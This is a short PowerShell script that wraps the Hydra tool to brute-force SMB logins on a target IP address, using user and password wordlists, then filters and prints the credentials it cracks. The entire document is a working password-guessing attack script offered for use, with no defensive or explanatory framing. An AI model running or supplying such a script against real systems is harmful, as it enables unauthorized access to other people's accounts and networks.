
function run-hydra {
# password
hydra.exe -L .\users.txt -P .\pass_password.txt -o hydra_password.txt $target smb 
Get-Content .\hydra_brute_password.txt | findstr "\[smb\]" | sort-object| Get-Unique > hydra_brute_password_cracked.txt
echo ""
echo "################ FINISHED ################"
echo ""
Get-Content .\hydra_brute_password_cracked.txt
}

# Run 

if ($target) { 
run-hydra | Tee hydra_brute_password.txt
} else {
Write-Host "USEAGE: " 
Write-Host "	./hydra_brute_password.ps1 [IP ADDRESS]" 
Write-Host "" 
Write-Host "" 
}



